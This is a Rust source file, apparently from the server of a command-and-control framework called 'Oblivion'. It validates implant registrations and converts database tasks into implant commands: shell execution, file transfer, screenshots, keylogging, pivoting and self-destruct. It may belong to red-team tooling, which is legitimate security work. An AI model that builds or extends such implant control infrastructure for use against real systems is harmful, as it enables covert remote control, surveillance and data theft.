use prost::Message;
use uuid::Uuid;

// Include generated protobuf code
pub mod proto {
    include!(concat!(env!("OUT_DIR"), "/oblivion.c2.rs"));
}

use proto::*;

impl RegisterRequest {
    pub fn validate(&self) -> crate::Result<()> {
        if self.implant_id.is_empty() {
            return Err(crate::OblivionError::InvalidMessage);
        }
        if self.hostname.is_empty() {
            return Err(crate::OblivionError::InvalidMessage);
        }
        Ok(())
    }
}

impl TaskAssignment {
    pub fn new(task_id: u64, task_type: TaskType, payload: Vec<u8>, timeout_sec: u32) -> Self {
        Self {
            task_id,
            task_type: task_type as i32,
            payload,
            timeout_sec,
        }
    }
}

impl From<crate::database::models::Task> for TaskAssignment {
    fn from(task: crate::database::models::Task) -> Self {
        let task_type = match task.task_type.as_str() {
            "shell_exec" => TaskType::ShellExec,
            "file_upload" => TaskType::FileUpload,
            "file_download" => TaskType::FileDownload,
            "process_list" => TaskType::ProcessList,
            "screenshot" => TaskType::Screenshot,
            "keylog_start" => TaskType::KeylogStart,
            "keylog_stop" => TaskType::KeylogStop,
            "pivot_setup" => TaskType::PivotSetup,
            "self_destruct" => TaskType::SelfDestruct,
            _ => TaskType::ShellExec,
        };
        
        Self {
            task_id: task.id as u64,
            task_type: task_type as i32,
            payload: task.payload.unwrap_or_default(),
            timeout_sec: task.timeout_seconds.unwrap_or(60) as u32,
        }
    }
}